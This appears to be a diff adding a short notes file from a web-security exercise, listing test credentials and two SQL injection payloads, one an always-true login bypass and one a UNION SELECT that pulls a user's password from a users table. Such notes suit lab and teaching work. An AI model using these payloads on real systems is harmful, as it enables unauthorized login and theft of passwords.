@@ -1,0 +1,5 @@
+username/password:           Xd5yKPviX4 carson1234
+other random user:           ?????????? code1111
+
+carson1234' OR 'hi' = 'hi
+carson1234' UNION SELECT password FROM users u WHERE u.username = 'carson1234
